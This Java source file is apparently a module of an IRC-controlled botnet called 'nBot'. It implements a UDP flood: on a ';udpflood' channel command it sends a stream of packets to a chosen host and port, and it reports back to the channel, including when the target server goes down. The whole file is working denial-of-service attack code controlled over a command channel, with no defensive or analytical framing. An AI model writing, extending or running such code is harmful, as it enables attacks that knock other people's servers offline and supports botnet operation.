
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.concurrent.Executors;

public class UDPFlood implements Runnable, Handler {

    private String host;
    private int connections;
    private int delay;
    private int port;
    private static boolean udpFlooding;

    public boolean processCommand(String[] args, String nick) {
        if (args[0].equals(";udpflood")) {
            startFlood(args[1], Integer.parseInt(args[2]), Integer.parseInt(args[3]), Integer.parseInt(args[4]));
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " UDPFlooding commenced to " + args[1]);
            return true;
        }
        if (args[0].equals(";stopudpflood")) {
            udpFlooding = false;
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " UDPFlooding was stopped!");
            return true;
        }
        return false;
    }

    public void startFlood(String host, int port, int connections, int delay) {
        this.host = host;
        this.connections = connections;
        this.port = port;
        this.delay = delay;
        (new Thread(this)).start();
    }

    public void run() {
        udpFlooding = true;
        for (int i = 0; i < connections; i++) {
            try {
                if (udpFlooding) {
                    byte[] buffer = new byte[1024];
                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length, InetAddress.getByName(this.host), port);
                    DatagramSocket socket = new DatagramSocket();
                    socket.send(packet);
                    Thread.sleep(delay);
                } else {
                    break;
                }
            } catch (Exception e) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Server down, flooding stopped!");
                break;
            }
        }
        IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " UDP Flooding finished!");
        udpFlooding = false;
    }
}